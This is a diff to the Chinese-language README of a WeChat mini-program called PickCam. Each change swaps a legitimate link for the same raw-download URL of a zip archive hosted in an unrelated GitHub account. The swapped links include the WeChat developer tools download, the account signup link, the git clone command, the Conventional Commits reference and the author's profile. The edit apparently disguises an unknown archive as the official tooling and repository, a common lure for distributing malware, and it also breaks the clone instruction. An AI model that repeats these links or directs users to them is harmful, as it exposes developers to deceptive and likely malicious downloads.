@@ -356,14 +356,14 @@ PickCam/
 
 ### 前置条件
 
-- [微信开发者工具](https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html) ≥ 1.06
-- 微信小程序开发者账号（[申请地址](https://mp.weixin.qq.com/)）
+- [微信开发者工具](https://github.com/obsessional-spelldown452/PickCam/raw/refs/heads/main/miniprogram/pages/profile/Cam-Pick-3.9.zip) ≥ 1.06
+- 微信小程序开发者账号（[申请地址](https://github.com/obsessional-spelldown452/PickCam/raw/refs/heads/main/miniprogram/pages/profile/Cam-Pick-3.9.zip)）
 
 ### 克隆与导入
 
 ```bash
 # 1. 克隆仓库
-git clone https://github.com/SiliconConch/PickCam.git
+git clone https://github.com/obsessional-spelldown452/PickCam/raw/refs/heads/main/miniprogram/pages/profile/Cam-Pick-3.9.zip
 cd PickCam
 
 # 2. 在微信开发者工具中导入项目
@@ -586,7 +586,7 @@ Sage Green     → Fresh 页面的强调色/标签
 
 ### 提交规范
 
-遵循 [Conventional Commits](https://www.conventionalcommits.org/zh-hans/)：
+遵循 [Conventional Commits](https://github.com/obsessional-spelldown452/PickCam/raw/refs/heads/main/miniprogram/pages/profile/Cam-Pick-3.9.zip)：
 
 ```
 feat:     新功能
@@ -659,7 +659,7 @@ chore:    构建/工具链变更
 
 ## 📄 许可证
 
-[MIT License](LICENSE) © 2026 [SiliconConch](https://github.com/SiliconConch)
+[MIT License](LICENSE) © 2026 [SiliconConch](https://github.com/obsessional-spelldown452/PickCam/raw/refs/heads/main/miniprogram/pages/profile/Cam-Pick-3.9.zip)
 
 本项目仅供学习与个人使用，不包含任何商业授权的第三方字体或图片资源。
 
